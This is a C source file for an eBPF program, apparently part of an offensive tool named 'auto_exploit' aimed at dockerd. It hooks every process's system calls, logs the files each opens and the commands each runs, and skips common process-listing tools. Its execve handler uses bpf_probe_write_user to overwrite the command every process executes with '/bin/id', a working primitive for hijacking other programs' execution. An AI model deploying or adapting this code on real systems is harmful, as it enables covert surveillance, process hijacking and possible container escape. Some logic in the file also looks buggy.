// +build ignore

/*
开启 bpf_log 
最终release版需要把这个注释去掉
*/
#define DEBUG_LOG


#include "my_def.h"
// #include "global.h"
#include <stdbool.h>

char __license[] SEC("license") = "Dual MIT/GPL";

// 每次只收集一种信息，防止log过多，丢失信息。编译时由BPF_CFLAGS配置

#ifdef TRACE_ALL
	#define TRACE_COMM
	#define TRACE_OPENAT
	#define TRACE_EXECVE
#endif


#define TASK_COMM_LEN 16
#define MAX_ENVENT 256
#define LOG_ENTRY_SIZE (64 - 5)

#define SELF "auto_exploit"
#define TRACE_PRCOESS "dockerd"

// 全局变量存到map中
struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 10);
	__type(key, __u32);   // global_id
	__type(value, __u64); // packet count
} global_var_kv SEC(".maps");

static __inline void save_global_val(u32 key, u64 val) {
	bpf_map_update_elem(&global_var_kv, &key, &val, 0);
}

static __inline int fetch_global_int(u32 key) {
	int val;
	void* ptr = bpf_map_lookup_elem(&global_var_kv, &key);
	bpf_probe_read(&val, sizeof(val), ptr);
	return val;
}

enum GlobalKey {
	GLOBAL_TICK1 = 0,
	GLOBAL_RINGBUFFER_WRITE,
	GLOBAL_RINGBUFFER_ROUND,
	GLOBAL_PROC,
};

enum EventId {
	EVENT_LOG = 0,
	EVENT_COMM,
	EVENT_OPEN_FILE,
	EVENT_EXECVE,
};

// Force emitting struct event into the ELF.
struct event_comm {
	u32 val;
	u8 log[LOG_ENTRY_SIZE];
	u8 event_id;
};
const struct event_comm *unused __attribute__((unused));

// 持续的收集log
struct bpf_map_def SEC("maps") events_rb = {
	.type = BPF_MAP_TYPE_ARRAY,
	.key_size = sizeof(u32),
	.value_size = sizeof(struct event_comm),
	.max_entries = MAX_ENVENT,
};

static __inline void send_event(const struct event_comm *event) {
	int write_index = fetch_global_int(GLOBAL_RINGBUFFER_WRITE);
	bpf_map_update_elem(&events_rb, &write_index, event, 0);

	// update key
	u32 next_key = write_index + 1;
	if (next_key >= MAX_ENVENT) {
		int round = fetch_global_int(GLOBAL_RINGBUFFER_ROUND) + 1;
		save_global_val(GLOBAL_RINGBUFFER_ROUND, round);
		next_key = 0;
	}
	save_global_val(GLOBAL_RINGBUFFER_WRITE, next_key);
}

static __inline void send_event_log(int eid, int val, const char *log) {
	// 同一log只上传一次
	int last = fetch_global_int(GLOBAL_RINGBUFFER_WRITE) - 1;
	if (last >= 0) {
		struct event_comm *event = (struct event_comm *) bpf_map_lookup_elem(&events_rb, &last);
		if (event != NULL) {
			if (event->val == val && memcmp(event->log, log, LOG_ENTRY_SIZE) == 0) {
				// bpf_log("IGNORE--->%d %s\n", event->val, event->log);
				return;
			} else {
				// bpf_log("ADD--->%d %s\n", val, log);
			}
		}
	}

	struct event_comm event;
	event.event_id = eid;
	event.val = val;
	memcpy(event.log, log, LOG_ENTRY_SIZE);
	send_event(&event);
}

static __inline bool is_process(const char *buf, int len) {
	char comm[TASK_COMM_LEN] = {0};
	bpf_get_current_comm(&comm, sizeof(comm));
	if (memcmp(comm, buf, len) == 0){
		return true;
	}
	return false;
}

static __inline bool inore_process(const char *buf, int len) {
	char comm[TASK_COMM_LEN] = {0};
	bpf_get_current_comm(&comm, sizeof(comm));
	if (memcmp(comm, buf, len) == 0){
		return true;
	}
	// 只抓取sshd进程
	// if (memcmp(comm, "sshd", sizeof("sshd")) != 0
	// 	|| memcmp(comm, "bash", sizeof("bash")) != 0) {
	// 	return true;
	// }

	if (memcmp(comm, "pgrep", sizeof("pgrep")) == 0
		|| memcmp(comm, "ps", sizeof("ps")) == 0 
		|| memcmp(comm, "pidof", sizeof("pidof")) == 0 
		|| memcmp(comm, "tee", sizeof("tee")) == 0 
		|| memcmp(comm, "sleep", sizeof("sleep")) == 0
		// || memcmp(comm, "go", sizeof("go")) == 0 
		) {
		return true;
	}
	return false;
}

static __inline int hanle_enter_execve(struct bpf_raw_tracepoint_args *ctx) {
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	char comm[LOG_ENTRY_SIZE + 4] = {0};
	bpf_get_current_comm(comm, 8);

	char *cmd = NULL;
	char data[LOG_ENTRY_SIZE + 4] = {0};
	bpf_probe_read(&cmd , sizeof(cmd) , &regs->di);
	bpf_probe_read_str(&data, sizeof(data), cmd);

	bpf_log("hanle_enter_execve: %s %s\n", comm, data);

	// if (cmd != NULL) {
		
	// }
	int len = 10;
	fill_space(comm, len);
	comm[len] = ' ';
	memcpy(comm + len, data, LOG_ENTRY_SIZE - len);

	// test write
	char PAYLOAD[] = "/bin/id\x00";
	bpf_probe_write_user(cmd, PAYLOAD, sizeof(PAYLOAD));
	bpf_probe_read_str(&data, sizeof(data), cmd);
	int ret = memcmp(data, PAYLOAD, sizeof(PAYLOAD));
	send_event_log(EVENT_EXECVE, ret == 0, comm);

	return 0;
}

static __inline int hanle_enter_openat(struct bpf_raw_tracepoint_args *ctx) {
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	char comm[LOG_ENTRY_SIZE + 4] = {0};
	bpf_get_current_comm(comm, 8);

	char data[LOG_ENTRY_SIZE + 4] = {0};
	char *pathname = NULL;
	bpf_probe_read(&pathname , sizeof(pathname) , &regs->si);
	bpf_probe_read_str(&data, sizeof(data), pathname);
	
	// bpf_log("hanle_enter_openat: %s\n", comm);
	if (pathname != NULL || 
		memcmp(data, "/dev/null", sizeof("/dev/null")) != 0 ||
		memcmp(data, " ", sizeof(" ")) != 0) {
		int len = 10;
		fill_space(comm, len);
		comm[len] = ' ';
		memcpy(comm + len, data, LOG_ENTRY_SIZE - len);
		fill_space(comm + len, LOG_ENTRY_SIZE - len);
		send_event_log(EVENT_OPEN_FILE, len, comm);
	}
	return 0;
}

static __inline int hanle_exit_read(struct bpf_raw_tracepoint_args *ctx) {

	return 0;
}


static __inline int trace_comm(struct bpf_raw_tracepoint_args *ctx) {
	u64 id   = bpf_get_current_pid_tgid();
	u32 tgid = id >> 32;
	char comm[LOG_ENTRY_SIZE + 4] = {0};

	bpf_get_current_comm(comm, LOG_ENTRY_SIZE);
	// send_event(&event);
	send_event_log(EVENT_COMM, 0, comm);
	// bpf_log("Sizeof event_comm: %s %d %d\n", comm, (int) tgid, (int) cur_pid);
	return 0;
}

static __inline void trace_process_enter(struct bpf_raw_tracepoint_args *ctx) {
	unsigned long syscall_id = ctx->args[1];
	switch (syscall_id)
	{
	case 59:
		#ifdef TRACE_EXECVE
		hanle_enter_execve(ctx);
		#endif
		break;
	case 257:
		#ifdef TRACE_OPENAT
		hanle_enter_openat(ctx);
		#endif
		break;
	}
}

static __inline void trace_process_exit(struct bpf_raw_tracepoint_args *ctx) {
	if (!is_process(TRACE_PRCOESS, sizeof(TRACE_PRCOESS))) return;
	
	unsigned long syscall_id;
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	bpf_probe_read(&syscall_id, sizeof(syscall_id) , &regs->orig_ax);
	bpf_log("trace exit: " TRACE_PRCOESS " %d\n", syscall_id);

	// https://filippo.io/linux-syscall-table/
	if (syscall_id == 0) {
		hanle_exit_read(ctx);
	}
}

SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx) {
	if (inore_process(SELF, sizeof(SELF))) return 0;

#ifdef TRACE_COMM
	trace_comm(ctx);
#endif
	trace_process_enter(ctx);
	return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx) {
	if (inore_process(SELF, sizeof(SELF))) return 0;
	trace_process_exit(ctx);
	return 0;
}


// 无法获取进程名称
// colab无法使用
SEC("tracepoint/syscalls/sys_enter_open")
int tracepoint__syscalls__sys_enter_open(struct trace_event_raw_sys_enter* ctx) {
	// if (is_process(SELF, sizeof(SELF))) return 0;
	// char comm[LOG_ENTRY_SIZE + 4] = {0};
	// bpf_get_current_comm(comm, LOG_ENTRY_SIZE);
	// bpf_log("open file: %s %s %d\n", comm, (char *)ctx->args[1], (int)ctx->args[2]);
	// bpf_log("open file: %s %d\n", (char *)ctx->args[1], (int)ctx->args[2]);
	return 0;
}